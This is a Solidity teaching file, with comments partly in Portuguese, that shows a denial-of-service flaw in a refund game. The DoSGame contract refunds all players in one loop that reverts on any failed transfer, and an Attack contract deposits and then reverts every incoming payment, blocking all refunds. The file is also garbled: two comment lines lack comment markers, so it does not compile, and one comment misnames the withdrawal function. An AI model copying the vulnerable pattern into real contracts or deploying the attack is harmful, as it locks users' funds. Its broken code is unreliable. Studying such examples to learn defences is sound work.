// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

// Jogo com vulnerabilidade de DoS, os jogadores depositam dinheiro primeiro, e depois, ao final do jogo, chamam o método deposit para retirar o dinheiro de volta.
contract DoSGame {
    bool public refundFinished;
    mapping(address => uint256) public balanceOf;
    address[] public players;
    
    // Todos os jogadores depositam ETH no contrato.
    function deposit() external payable {
        require(!refundFinished, "Game Over");
        require(msg.value > 0, "Please donate ETH");
        // Registre o depósito
        balanceOf[msg.sender] = msg.value;
        // Record player address
        players.push(msg.sender);
    }

    O jogo acabou, o reembolso começou, todos os jogadores receberão reembolso em sequência.
    function refund() external {
        require(!refundFinished, "Game Over");
        uint256 pLength = players.length;
        // Refund all players through a loop
        for(uint256 i; i < pLength; i++){
            address player = players[i];
            uint256 refundETH = balanceOf[player];
            (bool success, ) = player.call{value: refundETH}("");
            require(success, "Refund Fail!");
            balanceOf[player] = 0;
        }
        refundFinished = true;
    }

    function balance() external view returns(uint256){
        return address(this).balance;
    }
}

contract Attack {
    // DoS attack during refund

// Ataque de negação de serviço durante reembolso
    fallback() external payable{
        revert("DoS Attack!");
    }

    Participar do jogo DoS e fazer um depósito.
    function attack(address gameAddr) external payable {
        DoSGame dos = DoSGame(gameAddr);
        dos.deposit{value: msg.value}();
    }
}